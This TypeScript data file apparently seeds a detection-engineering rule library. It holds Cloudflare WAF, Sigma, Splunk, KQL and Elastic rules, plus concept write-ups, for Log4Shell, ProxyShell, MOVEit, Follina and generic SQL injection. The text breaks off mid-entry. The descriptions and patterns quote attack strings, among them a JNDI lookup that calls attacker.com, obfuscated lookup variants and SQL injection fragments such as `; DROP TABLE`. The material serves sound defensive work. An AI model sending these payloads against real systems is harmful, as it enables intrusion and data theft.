import type { RuleSeed } from "../types";

export const webAttackRules: RuleSeed[] = [
  // --- Log4Shell family (Cloudflare + Sigma + Splunk) ---
  {
    family: {
      id: "fam-log4shell",
      name: "Log4Shell (CVE-2021-44228) Exploitation Attempt",
      slug: "log4shell-exploitation-attempt",
      categoryId: "cat-web-attacks",
      conceptDescription:
        "Log4Shell is a critical remote code execution vulnerability in Apache Log4j2, one of the most widely used Java logging libraries. The vulnerability arises because Log4j2's message lookup feature evaluates JNDI (Java Naming and Directory Interface) lookup strings embedded in logged data, such as `${jndi:ldap://attacker.com/a}`. If an attacker can get *any* attacker-controlled string into something the application logs - an HTTP header (especially User-Agent, X-Forwarded-For, or Referer), a form field, a JSON body value - and that string is processed by a vulnerable Log4j2 version, the application will make an outbound LDAP/RMI connection to the attacker's server, which can respond with a serialized Java object leading to arbitrary code execution.\n\nBecause the payload can be placed in virtually any user-controlled input that ends up in a log line, and because the vulnerable code path exists deep in the logging library (often several layers removed from the developer's own code), this vulnerability had an enormous blast radius - effectively any Java application using a vulnerable Log4j2 version (2.0-beta9 through 2.14.1) was affected, regardless of what the application actually does.\n\nDetection at the network/WAF layer focuses on identifying the JNDI lookup syntax (`${jndi:`, `${${`, or obfuscated variants using nested lookups like `${${lower:j}ndi...}` to evade naive string matching) anywhere in the request - headers, body, or query string. Detection at the log/SIEM layer focuses on identifying outbound connections from application servers to unexpected LDAP (389), RMI, or HTTP ports following receipt of such a request, which confirms successful exploitation rather than just an attempt.\n\nFalse positives at the WAF layer are relatively rare for the core `${jndi:` pattern itself, but obfuscation-detection rules (looking for `${` patterns generally) can trigger on legitimate applications that use similar templating syntax (e.g., some templating engines, Spring expression language in legitimate contexts). The most reliable signal remains the literal `jndi:ldap`, `jndi:rmi`, or `jndi:dns` substrings, with additional rules for common obfuscation techniques layered on top.",
    },
    variants: [
      {
        id: "rule-log4shell-cloudflare",
        language: "cloudflare",
        platformVariant: "WAF Custom Rule",
        title: "Block Log4Shell JNDI Lookup Payloads in Requests",
        slug: "log4shell-jndi-lookup-cloudflare",
        descriptionSummary:
          "Cloudflare WAF custom rule blocking requests containing JNDI lookup syntax associated with Log4Shell (CVE-2021-44228) in headers, query strings, or body.",
        ruleBody: `# Cloudflare WAF Custom Rule Expression
# Action: Block (or Managed Challenge during initial rollout to monitor for FPs)
# Field: Custom rule expression (Firewall Rules / WAF -> Custom rules)

(
  any(http.request.headers.values[*] contains "\${jndi:") or
  any(http.request.headers.values[*] contains "\${\${") or
  http.request.uri.query contains "\${jndi:" or
  http.request.uri.query contains "\${\${" or
  http.request.body.raw contains "\${jndi:" or
  http.request.body.raw contains "\${\${"
)
and not (ip.src in $known_scanner_allowlist)

# --- Companion rule for common obfuscation (case/encoding tricks) ---
# Catches patterns like \${\${lower:j}ndi:\${lower:l}dap://...}
# Field: Custom rule expression
(
  http.request.headers.values[*] matches "(?i)\\\\$\\\\{[a-z:\${}]*j[a-z:\${}]*n[a-z:\${}]*d[a-z:\${}]*i[a-z:\${}]*:"
)`,
        ruleFormatVersion: "Cloudflare WAF Custom Rules (Wirefilter syntax)",
        severity: "critical",
        status: "stable",
        author: "Sentriq Detection Engineering",
        ruleVersion: "1.3",
        falsePositiveNotes:
          "Internal vulnerability scanners and red team tooling that test for Log4Shell will trigger this rule by design - maintain a `$known_scanner_allowlist` IP list for authorized scanning sources during pentest windows. The regex-based obfuscation rule has a higher false-positive potential on applications that legitimately process strings containing many `${` and `:` characters (rare, but some configuration-management UIs echo template syntax back to users) - deploy this companion rule in Log-only/Managed Challenge mode first and review matches for 1-2 weeks before moving to Block.",
        dataSourceRequirements:
          "Cloudflare WAF / Firewall Rules enabled on the zone, inspecting HTTP headers, query string, and request body (body inspection requires appropriate plan tier).",
        mitreTechniqueIds: ["T1190"],
        cveIds: ["CVE-2021-44228"],
        tags: ["Log4j", "Java", "RCE", "WAF"],
        references: [
          {
            url: "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
            title: "NVD - CVE-2021-44228",
            referenceType: "cve_record",
          },
          {
            url: "https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/",
            title: "Cloudflare - Inside the Log4j2 vulnerability",
            referenceType: "vendor_advisory",
          },
        ],
      },
      {
        id: "rule-log4shell-sigma",
        language: "sigma",
        title: "Log4Shell Exploitation - JNDI Lookup in Web Server Logs",
        slug: "log4shell-jndi-lookup-weblogs-sigma",
        descriptionSummary:
          "Sigma rule for web server / proxy logs detecting JNDI lookup strings in URL paths, query strings, or headers indicative of Log4Shell exploitation attempts.",
        ruleBody: `title: Log4Shell JNDI Lookup Pattern in Web Request
id: 2d3e4f5a-6b7c-4d8e-9f0a-1b2c3d4e5f6a
status: stable
description: |
    Detects the characteristic \${jndi:...} lookup syntax used to exploit the Log4Shell
    vulnerability (CVE-2021-44228) in Apache Log4j2, appearing in web server access logs
    as part of the URL, query string, or logged request headers (User-Agent, X-Forwarded-For,
    Referer are the most commonly abused header injection points).
references:
    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
    - https://www.lunasec.io/docs/blog/log4j-zero-day/
author: Sentriq Detection Engineering
date: 2021-12-13
modified: 2024-03-01
tags:
    - attack.initial_access
    - attack.t1190
    - cve.2021.44228
logsource:
    category: webserver
detection:
    selection:
        cs-uri-query|contains:
            - '\${jndi:ldap'
            - '\${jndi:rmi'
            - '\${jndi:dns'
            - '\${jndi:ldaps'
    selection_obfuscated:
        cs-uri-query|contains:
            - '\${\${lower:'
            - '\${\${upper:'
            - '\${::-'
    condition: selection or selection_obfuscated
falsepositives:
    - Authorized vulnerability scanning / penetration testing for Log4Shell
level: critical`,
        ruleFormatVersion: "Sigma Schema 2.0",
        severity: "critical",
        status: "stable",
        author: "Sentriq Detection Engineering",
        ruleVersion: "1.2",
        falsePositiveNotes:
          "Authorized scanning (Nessus, Qualys, internal red team Log4Shell checks) will generate matches - coordinate scan windows with the SOC or maintain a scanner-IP allowlist applied at the SIEM correlation layer. This rule detects *attempts*; a successful exploitation should be confirmed by correlating with outbound LDAP/RMI connections from the affected application server (see companion network-egress detection).",
        dataSourceRequirements:
          "Web server / reverse proxy access logs (Apache, Nginx, IIS, or cloud load balancer logs) containing the full request URI and headers.",
        mitreTechniqueIds: ["T1190"],
        cveIds: ["CVE-2021-44228"],
        tags: ["Log4j", "Java", "RCE"],
        references: [
          {
            url: "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
            title: "NVD - CVE-2021-44228",
            referenceType: "cve_record",
          },
        ],
      },
      {
        id: "rule-log4shell-splunk",
        language: "splunk",
        title: "Log4Shell - Outbound LDAP/RMI Connection Following Suspicious Request",
        slug: "log4shell-outbound-ldap-correlation-splunk",
        descriptionSummary:
          "SPL correlation search joining web access logs containing JNDI payloads with subsequent outbound LDAP/RMI connections from the same host, confirming successful Log4Shell exploitation.",
        ruleBody: `\`# Log4Shell Exploitation Confirmation - Splunk SPL\`
\`# Correlates inbound JNDI payloads (web logs) with outbound LDAP/RMI\`
\`# connections from the same application server within 60 seconds\`

(index=web_proxy sourcetype IN ("access_combined", "f5:bigip:*", "cloudflare:logpush")
    (uri_query="*\${jndi:*" OR http_user_agent="*\${jndi:*" OR http_referer="*\${jndi:*"))
| eval event_type="suspicious_request"
| fields _time, dest_host, src_ip, uri_query, http_user_agent, event_type
| append [
    search index=network_traffic sourcetype="netflow" dest_port IN (389, 636, 1099, 1389)
    | eval event_type="outbound_jndi_protocol"
    | fields _time, src_host as dest_host, dest_ip, dest_port, event_type
  ]
| stats earliest(_time) as first_seen, latest(_time) as last_seen,
        values(event_type) as event_types,
        values(uri_query) as payloads,
        values(dest_ip) as ldap_destinations
        by dest_host
| where mvcount(event_types) > 1
| eval time_delta = last_seen - first_seen
| where time_delta < 60
| eval verdict = "CONFIRMED LOG4SHELL EXPLOITATION - outbound JNDI callback observed"
| table dest_host, first_seen, last_seen, payloads, ldap_destinations, verdict`,
        ruleFormatVersion: "SPL (Search Processing Language)",
        severity: "critical",
        status: "stable",
        author: "Sentriq Detection Engineering",
        ruleVersion: "1.0",
        falsePositiveNotes:
          "This correlation search is intentionally conservative - it requires BOTH an inbound JNDI payload AND a closely-timed outbound LDAP/RMI-port connection from the same host, which dramatically reduces false positives compared to the request-only detection. Legitimate LDAP traffic from application servers to internal directory services on port 389/636 could coincidentally fall within the window if the host also happens to receive a benign scan; review `ldap_destinations` and exclude known-internal directory server IPs from the netflow search.",
        dataSourceRequirements:
          "Web/proxy access logs (sourcetype access_combined or equivalent) and network flow data (netflow/firewall logs) both ingested into the same Splunk index or accessible via federated search.",
        mitreTechniqueIds: ["T1190", "T1071.001"],
        cveIds: ["CVE-2021-44228"],
        tags: ["Log4j", "Java", "RCE", "Correlation"],
        references: [
          {
            url: "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
            title: "NVD - CVE-2021-44228",
            referenceType: "cve_record",
          },
        ],
      },
    ],
  },

  // --- ProxyShell family (KQL + Sigma) ---
  {
    family: {
      id: "fam-proxyshell",
      name: "ProxyShell Exchange Server Exploitation Chain",
      slug: "proxyshell-exchange-exploitation",
      categoryId: "cat-cve-exploitation",
      conceptDescription:
        "ProxyShell refers to an exploit chain combining three vulnerabilities in Microsoft Exchange Server: CVE-2021-34473 (pre-auth RCE via Autodiscover), CVE-2021-34523 (privilege escalation in the Exchange PowerShell backend), and CVE-2021-31207 (post-auth arbitrary file write leading to RCE). Chained together, these allow a completely unauthenticated attacker to achieve remote code execution on an Exchange server, typically by first hitting the Autodiscover endpoint with a crafted request to obtain a valid session/identity, then using that session to access the Exchange PowerShell remoting backend (`/powershell/`) and finally writing a web shell to an accessible directory under the Exchange web root (commonly via the Offline Address Book or Unified Messaging endpoints).\n\nThe most visible artifact across the chain is the sequence of requests to `/autodiscover/autodiscover.json`, followed by requests to `/EWS/`, `/PowerShell/`, or `/mapi/` endpoints with unusual parameters, culminating in a webshell file (often an .aspx file with a short, randomly-generated or generic name like `RedirSuiteServiceProxy.aspx` or similar) being dropped in a writable IIS directory such as `\\inetpub\\wwwroot\\aspnet_client\\` or under an Exchange OAB virtual directory.\n\nDetection works best as a multi-stage pattern: (1) Autodiscover requests with suspicious query parameters or from external IPs not normally seen, (2) IIS logs showing a POST to a PowerShell or EWS endpoint shortly after, and (3) creation of a new .aspx file in an Exchange web directory by the IIS worker process (w3wp.exe) - the latter being the highest-confidence single signal since legitimate Exchange operation almost never writes new .aspx files to these paths post-installation.",
    },
    variants: [
      {
        id: "rule-proxyshell-kql",
        language: "kql",
        platformVariant: "Microsoft Sentinel / Defender for Endpoint",
        title: "ProxyShell: Web Shell Dropped via Exchange IIS Worker Process",
        slug: "proxyshell-webshell-iis-worker-kql",
        descriptionSummary:
          "Detects new .aspx files written to Exchange web directories by w3wp.exe, the highest-confidence indicator of successful ProxyShell exploitation and web shell deployment.",
        ruleBody: `// ProxyShell post-exploitation: web shell file write by IIS worker process
// Data source: DeviceFileEvents (Microsoft Defender for Endpoint)
DeviceFileEvents
| where Timestamp >= ago(1d)
| where InitiatingProcessFileName =~ "w3wp.exe"
| where FolderPath has_any (
    "\\\\HttpProxy\\\\owa\\\\auth\\\\",
    "\\\\FrontEnd\\\\HttpProxy\\\\OAB\\\\",
    "\\\\ClientAccess\\\\ecp\\\\auth\\\\",
    "\\\\inetpub\\\\wwwroot\\\\aspnet_client\\\\"
)
| where FileName endswith ".aspx"
| where ActionType == "FileCreated"
| extend AccountCustomEntity = InitiatingProcessAccountName
| project Timestamp, DeviceName, FolderPath, FileName, InitiatingProcessFileName, InitiatingProcessAccountName, SHA256
| order by Timestamp desc

// --- Companion: Stage 1 indicator - suspicious Autodiscover requests ---
// Data source: W3CIISLog (if ingested) or equivalent IIS log table
// W3CIISLog
// | where csUriStem has "/autodiscover/autodiscover.json"
// | where csUriQuery has "@" and csUriQuery has "Powershell"
// | project TimeGenerated, cIP, csUriStem, csUriQuery, scStatus`,
        ruleFormatVersion: "Sentinel Analytics Rule / Defender Advanced Hunting",
        severity: "critical",
        status: "stable",
        author: "Sentriq Detection Engineering",
        ruleVersion: "1.1",
        falsePositiveNotes:
          "Legitimate Exchange Cumulative Update (CU) installations write new .aspx files to similar directories during patching - exclude file-write events that occur within a known maintenance window AND are signed by Microsoft (check `SHA256` against Microsoft's published CU hashes, or correlate with `InitiatingProcessAccountName` being SYSTEM during an active MSI installation rather than the IIS app pool identity). Outside of patching windows, a w3wp.exe-written .aspx file in these specific directories should be treated as critical with no further tuning needed.",
        dataSourceRequirements:
          "Microsoft Defender for Endpoint onboarded on Exchange servers (DeviceFileEvents table), or equivalent file-creation telemetry from EDR/Sysmon Event ID 11 scoped to Exchange web directories.",
        mitreTechniqueIds: ["T1190", "T1505.003"],
        cveIds: ["CVE-2021-34473", "CVE-2021-34523"],
        tags: ["Exchange Server", "Web Shell", "ProxyShell"],
        references: [
          {
            url: "https://nvd.nist.gov/vuln/detail/CVE-2021-34473",
            title: "NVD - CVE-2021-34473",
            referenceType: "cve_record",
          },
          {
            url: "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34473",
            title: "Microsoft Security Response Center - CVE-2021-34473",
            referenceType: "vendor_advisory",
          },
        ],
      },
      {
        id: "rule-proxyshell-sigma",
        language: "sigma",
        title: "ProxyShell: Suspicious Autodiscover Request with PowerShell Reference",
        slug: "proxyshell-autodiscover-powershell-sigma",
        descriptionSummary:
          "Detects the first-stage indicator of ProxyShell exploitation - requests to the Exchange Autodiscover endpoint containing references to the PowerShell backend in the query string.",
        ruleBody: `title: ProxyShell Stage 1 - Suspicious Autodiscover Request
id: 5e6f7a8b-9c0d-4e1f-8a2b-3c4d5e6f7a8b
status: stable
description: |
    Detects requests to the Exchange Autodiscover endpoint (/autodiscover/autodiscover.json)
    containing an '@' character followed by a reference to 'Powershell' in the query string -
    the characteristic first-stage request of the ProxyShell exploit chain (CVE-2021-34473),
    used to obtain a valid session identity for subsequent stages.
references:
    - https://nvd.nist.gov/vuln/detail/CVE-2021-34473
    - https://proxyshell.com
author: Sentriq Detection Engineering
date: 2021-08-10
tags:
    - attack.initial_access
    - attack.t1190
    - cve.2021.34473
logsource:
    category: webserver
    product: iis
detection:
    selection:
        cs-uri-stem|contains: '/autodiscover/autodiscover.json'
        cs-uri-query|contains:
            - '@'
        cs-uri-query|contains|all:
            - '@'
            - 'Powershell'
    condition: selection
falsepositives:
    - Legitimate Outlook Autodiscover requests rarely include 'Powershell' in the query string; false positives are uncommon
level: high`,
        ruleFormatVersion: "Sigma Schema 2.0",
        severity: "high",
        status: "stable",
        author: "Sentriq Detection Engineering",
        ruleVersion: "1.0",
        falsePositiveNotes:
          "This stage-1 indicator alone does not confirm successful exploitation - it confirms exploitation *attempt*. Pair with the web-shell-write detection (KQL variant in this family) for confirmation of success. Patched Exchange servers (with the August 2021 security updates or later) will reject these requests with a 4xx/5xx response; check `scStatus` in the IIS logs - a 200 response to this pattern on an unpatched server is high confidence of successful stage-1 exploitation.",
        dataSourceRequirements:
          "IIS W3C extended logs from Exchange Client Access servers, including cs-uri-stem and cs-uri-query fields.",
        mitreTechniqueIds: ["T1190"],
        cveIds: ["CVE-2021-34473"],
        tags: ["Exchange Server", "ProxyShell"],
        references: [
          {
            url: "https://nvd.nist.gov/vuln/detail/CVE-2021-34473",
            title: "NVD - CVE-2021-34473",
            referenceType: "cve_record",
          },
        ],
      },
    ],
  },

  // --- MOVEit SQL Injection (Sigma) ---
  {
    family: {
      id: "fam-moveit-sqli",
      name: "MOVEit Transfer SQL Injection Exploitation (CVE-2023-34362)",
      slug: "moveit-sql-injection-exploitation",
      categoryId: "cat-cve-exploitation",
      conceptDescription:
        "CVE-2023-34362 is a SQL injection vulnerability in Progress MOVEit Transfer's web application that allows an unauthenticated attacker to gain access to the underlying database. The Cl0p ransomware group exploited this vulnerability at massive scale in May-June 2023, ultimately affecting thousands of organizations. The exploitation chain typically involves: (1) sending a crafted HTTP request to the MOVEit `/api/v1/folders` or `human.aspx` endpoints with SQL injection payloads to extract or modify database records, (2) using the resulting database access to create a rogue administrator session or API token, and (3) dropping a web shell (commonly named `human2.aspx`) to the MOVEit installation directory, which provides a backdoor for listing files, downloading arbitrary files, and creating/deleting users.\n\nThe most distinctive artifact is the `human2.aspx` web shell itself - a file with this exact name appearing in the MOVEit Transfer wwwroot directory is essentially pathognomonic for this specific campaign, as it is not a legitimate MOVEit component. Earlier-stage detection focuses on anomalous SQL error patterns in MOVEit's application logs and unexpected child processes spawned by the MOVEit IIS application pool (w3wp.exe), since MOVEit's normal operation does not spawn cmd.exe or powershell.exe.",
    },
    variants: [
      {
        id: "rule-moveit-sqli-sigma",
        language: "sigma",
        title: "MOVEit Transfer - Web Shell Drop or Suspicious Child Process",
        slug: "moveit-webshell-suspicious-child-process-sigma",
        descriptionSummary:
          "Detects the human2.aspx web shell file creation or anomalous child processes (cmd.exe, powershell.exe) spawned by the MOVEit Transfer IIS worker process, indicating CVE-2023-34362 exploitation.",
        ruleBody: `title: MOVEit Transfer Exploitation - Web Shell or Anomalous Child Process
id: 7f8a9b0c-1d2e-4f3a-8b4c-5d6e7f8a9b0c
status: stable
description: |
    Detects post-exploitation activity associated with CVE-2023-34362 (MOVEit Transfer
    SQL injection), including creation of the 'human2.aspx' web shell file used by the
    Cl0p ransomware group, or the MOVEit IIS application pool (w3wp.exe associated with
    the MOVEitTransfer app pool) spawning command interpreters - behavior that does not
    occur during normal MOVEit operation.
references:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-34362
    - https://www.mandiant.com/resources/blog/zero-day-moveit-data-theft
author: Sentriq Detection Engineering
date: 2023-06-05
tags:
    - attack.initial_access
    - attack.t1190
    - cve.2023.34362
logsource:
    product: windows
detection:
    selection_webshell:
        EventID: 11  # Sysmon FileCreate
        TargetFilename|endswith: '\\human2.aspx'
    selection_childproc:
        EventID: 1  # Sysmon ProcessCreate
        ParentImage|endswith: '\\w3wp.exe'
        ParentCommandLine|contains: 'MOVEitTransfer'
        Image|endswith:
            - '\\cmd.exe'
            - '\\powershell.exe'
            - '\\powershell_ise.exe'
    condition: selection_webshell or selection_childproc
falsepositives:
    - None known for selection_webshell (the filename is specific to this campaign)
    - Administrative scripts manually invoked by MOVEit administrators via scheduled tasks running under the same app pool identity (rare; verify against change records)
level: critical`,
        ruleFormatVersion: "Sigma Schema 2.0",
        severity: "critical",
        status: "stable",
        author: "Sentriq Detection Engineering",
        ruleVersion: "1.0",
        falsePositiveNotes:
          "The `human2.aspx` filename match has essentially zero false-positive rate - this is not a legitimate MOVEit file. The child-process selection is also extremely rare in normal operation; if it fires, treat as critical regardless of any 'administrative script' explanation unless confirmed in writing via change management, since this exact pattern was the primary post-exploitation vector for the Cl0p campaign.",
        dataSourceRequirements:
          "Sysmon (Event ID 1 and 11) or equivalent EDR process-creation and file-creation telemetry on MOVEit Transfer servers.",
        mitreTechniqueIds: ["T1190", "T1505.003"],
        cveIds: ["CVE-2023-34362"],
        tags: ["MOVEit", "Cl0p", "Web Shell", "Supply Chain"],
        references: [
          {
            url: "https://nvd.nist.gov/vuln/detail/CVE-2023-34362",
            title: "NVD - CVE-2023-34362",
            referenceType: "cve_record",
          },
          {
            url: "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-158a",
            title: "CISA Advisory AA23-158A - Cl0p MOVEit Exploitation",
            referenceType: "vendor_advisory",
          },
        ],
      },
    ],
  },

  // --- Follina (Sigma) ---
  {
    family: {
      id: "fam-follina",
      name: "Follina MSDT Remote Code Execution (CVE-2022-30190)",
      slug: "follina-msdt-rce",
      categoryId: "cat-cve-exploitation",
      conceptDescription:
        "Follina is a remote code execution vulnerability in the Microsoft Windows Support Diagnostic Tool (MSDT) that is triggered through Microsoft Office documents. The attack works by embedding a remote OLE object reference in a Word document (in `word/_rels/document.xml.rels`) that points to an external HTML file hosted on an attacker-controlled server. When the document is opened (or in some variants, even just previewed in Windows Explorer), Word fetches the HTML file, which contains JavaScript that invokes the `ms-msdt:` URI scheme with a crafted PCWDiagnostic configuration. This configuration includes a parameter that allows arbitrary PowerShell command execution, all without requiring macros to be enabled - which bypasses the macro-based defenses many organizations rely on as their primary mitigation against malicious Office documents.\n\nThe key detection opportunity is the parent-child process relationship: `winword.exe` (or `outlook.exe`, `excel.exe`) spawning `msdt.exe`, which is an extremely unusual relationship in normal usage - MSDT is typically launched directly by a user from the Settings troubleshooting UI, not by an Office application. A secondary, network-layer signal is an Office application making an outbound HTTP/HTTPS connection to fetch a remote template/HTML file from a non-Microsoft, non-organizational domain immediately before the msdt.exe spawn.",
    },
    variants: [
      {
        id: "rule-follina-sigma",
        language: "sigma",
        title: "Follina - Office Application Spawning MSDT.exe",
        slug: "follina-office-msdt-spawn-sigma",
        descriptionSummary:
          "Detects Microsoft Office applications (Word, Excel, Outlook) spawning msdt.exe, the core indicator of Follina (CVE-2022-30190) exploitation via malicious documents.",
        ruleBody: `title: Follina - MSDT Process Spawned by Office Application
id: 0a1b2c3d-4e5f-4a6b-9c7d-8e9f0a1b2c3d
status: stable
description: |
    Detects the Microsoft Diagnostic Tool (msdt.exe) being spawned as a child process of
    Microsoft Word, Excel, PowerPoint, or Outlook. This parent-child relationship does not
    occur during normal use - MSDT is launched by users directly from Settings - and is the
    primary indicator of CVE-2022-30190 (Follina) exploitation via a malicious document that
    references an external HTML file invoking the ms-msdt: URI handler.
references:
    - https://nvd.nist.gov/vuln/detail/CVE-2022-30190
    - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-30190
author: Sentriq Detection Engineering
date: 2022-05-30
tags:
    - attack.execution
    - attack.t1203
    - cve.2022.30190
logsource:
    product: windows
    category: process_creation
detection:
    selection:
        ParentImage|endswith:
            - '\\WINWORD.EXE'
            - '\\EXCEL.EXE'
            - '\\POWERPNT.EXE'
            - '\\OUTLOOK.EXE'
        Image|endswith: '\\msdt.exe'
    condition: selection
falsepositives:
    - None known - this parent-child relationship has no legitimate use case
level: critical`,
        ruleFormatVersion: "Sigma Schema 2.0",
        severity: "critical",
        status: "stable",
        author: "Sentriq Detection Engineering",
        ruleVersion: "1.0",
        falsePositiveNotes:
          "This rule has effectively no false positives - there is no legitimate workflow where opening an Office document results in msdt.exe being launched as its child process. Any hit should be treated as a confirmed exploitation attempt. Note that Microsoft's official mitigation (disabling the ms-msdt URI protocol handler via registry) prevents the technique from succeeding but does NOT prevent this detection from firing if the malicious document is opened, since the process spawn occurs as part of the (failed) exploitation attempt.",
        dataSourceRequirements:
          "Sysmon Event ID 1 (Process Create) or equivalent EDR process-creation telemetry with parent/child image paths.",
        mitreTechniqueIds: ["T1203", "T1566.001"],
        cveIds: ["CVE-2022-30190"],
        tags: ["Follina", "Office", "MSDT"],
        references: [
          {
            url: "https://nvd.nist.gov/vuln/detail/CVE-2022-30190",
            title: "NVD - CVE-2022-30190",
            referenceType: "cve_record",
          },
        ],
      },
    ],
  },

  // --- Generic SQL Injection (Cloudflare) ---
  {
    family: {
      id: "fam-generic-sqli",
      name: "Generic SQL Injection Patterns in HTTP Requests",
      slug: "generic-sql-injection-http",
      categoryId: "cat-web-attacks",
      conceptDescription:
        "SQL injection occurs when user-supplied input is concatenated into a SQL query without proper parameterization, allowing an attacker to alter the query's logic. Classic exploitation patterns include UNION-based injection (`UNION SELECT ... FROM ...`) to extract data from arbitrary tables, boolean-based blind injection (`' OR '1'='1`) to bypass authentication or extract data bit-by-bit via true/false responses, time-based blind injection (`SLEEP(5)`, `WAITFOR DELAY`) to exfiltrate data via response timing when no direct output is visible, and stacked queries (`; DROP TABLE ...`) to execute additional statements.\n\nAt the WAF layer, detection relies on pattern-matching common SQL syntax fragments in places they shouldn't normally appear - query string parameters, form fields, JSON body values, and cookies. The challenge is balancing sensitivity against false positives: legitimate applications sometimes have parameters that legitimately contain words like 'select', 'union', or 'order' (e.g., a parameter literally named `order` for sort direction, or free-text search fields where users type SQL-like terms for unrelated reasons). Effective rules therefore combine multiple suspicious tokens (e.g., a quote character AND a SQL keyword AND a comment marker) rather than alerting on any single keyword, and apply different sensitivity to different input locations (path/query parameters vs. free-text body fields).",
    },
    variants: [
      {
        id: "rule-generic-sqli-cloudflare",
        language: "cloudflare",
        platformVariant: "WAF Custom Rule",
        title: "Block Common SQL Injection Patterns in Query Strings and Bodies",
        slug: "generic-sqli-patterns-cloudflare",
        descriptionSummary:
          "Cloudflare WAF custom rule combining SQL keyword, comment, and quote-character heuristics to catch UNION-based, boolean, and time-based SQL injection attempts while minimizing false positives on legitimate parameters.",
        ruleBody: `# Cloudflare WAF Custom Rule Expression
# Action: Managed Challenge (recommended initial deployment) -> Block after tuning
# Field: Custom rule expression

(
  # UNION-based injection
  http.request.uri.query matches "(?i)union(\\\\s|/\\\\*.*?\\\\*/|%20|\\\\+)+select" or
  http.request.body.raw matches "(?i)union(\\\\s|/\\\\*.*?\\\\*/|%20|\\\\+)+select" or

  # Boolean-based / authentication bypass
  http.request.uri.query matches "(?i)('|%27)(\\\\s|%20)*(or|and)(\\\\s|%20)+('|%27)?(\\\\s|%20)*[0-9a-z]+(\\\\s|%20)*=(\\\\s|%20)*[0-9a-z]+" or

  # Time-based blind injection
  http.request.uri.query matches "(?i)(sleep\\\\(\\\\s*\\\\d|benchmark\\\\(|waitfor(\\\\s)+delay)" or
  http.request.body.raw matches "(?i)(sleep\\\\(\\\\s*\\\\d|benchmark\\\\(|waitfor(\\\\s)+delay)" or

  # Stacked queries / comment-based termination
  http.request.uri.query matches "(?i);(\\\\s)*(drop|alter|truncate|insert|update|delete)(\\\\s)+(table|into|from)" or
  http.request.uri.query contains "/*!" or
  http.request.uri.query contains "-- "
)
and not (ip.src in $known_scanner_allowlist)`,
        ruleFormatVersion: "Cloudflare WAF Custom Rules (Wirefilter syntax)",
        severity: "high",
        status: "stable",
        author: "Sentriq Detection Engineering",
        ruleVersion: "1.4",
        falsePositiveNotes:
          "The boolean-based pattern (`' OR 1=1`-style) can occasionally match legitimate content in free-text fields (rare, but e.g., a comment field discussing SQL syntax). Deploy in 'Managed Challenge' mode initially and review the Security Events log for the affected zone over 1-2 weeks; adjust the regex to require the pattern to appear in query-string parameters specifically (rather than POST body) for applications with rich-text/comment fields, since query parameters rarely contain legitimate free text. The time-based and stacked-query patterns have very low false-positive rates and can typically move to Block immediately. Always exclude authorized scanner IPs via `$known_scanner_allowlist`.",
        dataSourceRequirements:
          "Cloudflare WAF / Firewall Rules with body inspection enabled (requires Pro plan or higher for full body inspection).",
        mitreTechniqueIds: ["T1190"],
        cveIds: [],
        tags: ["SQL Injection", "WAF", "OWASP Top 10"],
        references: [
          {
            url: "https://owasp.org/www-community/attacks/SQL_Injection",
            title: "OWASP - SQL Injection",
            referenceType: "documentation",
          },
        ],
      },
      {
        id: "rule-generic-sqli-elastic",
        language: "elastic",
        platformVariant: "ES|QL (Detection Rule)",
        title: "SQL Injection Patterns in Web Server Access Logs",
        slug: "generic-sqli-patterns-elastic",
        descriptionSummary:
          "ES|QL rule over HTTP access log events (url.query / url.original) matching UNION-based, boolean, time-based, and stacked-query SQL injection patterns - the same heuristic set as the Cloudflare WAF variant, applied to Elastic-ingested web server logs.",
        ruleBody: `// Elastic Security Detection Rule - ES|QL
// Index pattern: logs-nginx.access-*, logs-apache.access-*, filebeat-*
// Matches the same heuristic families as the Cloudflare WAF variant of this
// rule family: UNION-based, boolean/auth-bypass, time-based blind, and
// stacked-query / comment-termination SQL injection patterns.

FROM logs-*
| WHERE event.category == "web" AND event.dataset LIKE "*access*"
| WHERE
    url.original RLIKE "(?i).*union(\\\\s|/\\\\*.*\\\\*/|%20|\\\\+)+select.*"
    OR url.original RLIKE "(?i).*('|%27)(\\\\s|%20)*(or|and)(\\\\s|%20)+('|%27)?(\\\\s|%20)*[0-9a-z]+(\\\\s|%20)*=(\\\\s|%20)*[0-9a-z]+.*"
    OR url.original RLIKE "(?i).*(sleep\\\\(\\\\s*[0-9]|benchmark\\\\(|waitfor(\\\\s)+delay).*"
    OR url.original RLIKE "(?i).*;(\\\\s)*(drop|alter|truncate|insert|update|delete)(\\\\s)+(table|into|from).*"
    OR url.original LIKE "*/*!*"
    OR url.original LIKE "*-- *"
| STATS
    request_count = COUNT(*),
    sample_uris = VALUES(url.original)
    BY source.ip, url.path, http.response.status_code
| WHERE request_count > 0
| SORT request_count DESC`,
        ruleFormatVersion: "Elastic Security Detection Rule (ES|QL)",
        severity: "high",
        status: "stable",
        author: "Sentriq Detection Engineering",
        ruleVersion: "1.0",
        falsePositiveNotes:
          "Identical false-positive profile to the Cloudflare WAF variant: the boolean-based pattern can occasionally match legitimate free-text search/comment fields passed as query parameters. Start with this rule in a detection-only (no auto-response) configuration and review matches for 1-2 weeks before wiring to an automated block (e.g., via a SOAR playbook that adds the source IP to a firewall blocklist). The time-based and stacked-query patterns have very low false-positive rates. If `url.original` is not populated by your ingest pipeline, use `url.query` instead and adjust patterns accordingly (it will not include the path component).",
        dataSourceRequirements:
          "Elastic Agent with a web server integration (Nginx, Apache, IIS) populating `url.original`, `source.ip`, `url.path`, and `http.response.status_code` per Elastic Common Schema. ES|QL rules require Elastic Stack 8.11+.",
        mitreTechniqueIds: ["T1190"],
        cveIds: [],
        tags: ["SQL Injection", "ES|QL", "OWASP Top 10"],
        references: [
          {
            url: "https://owasp.org/www-community/attacks/SQL_Injection",
            title: "OWASP - SQL Injection",
            referenceType: "documentation",
          },
        ],
      },
    ],
  },

  // --- Outlook NTLM Leak (KQL) ---
  {
    family: {
      id: "fam-outlook-ntlm-leak",
      name: "Outlook NTLM Credential Leak via Reminder Sound (CVE-2023-23397)",
      slug: "outlook-ntlm-credential-leak",
      categoryId: "cat-cve-exploitation",
      conceptDescription:
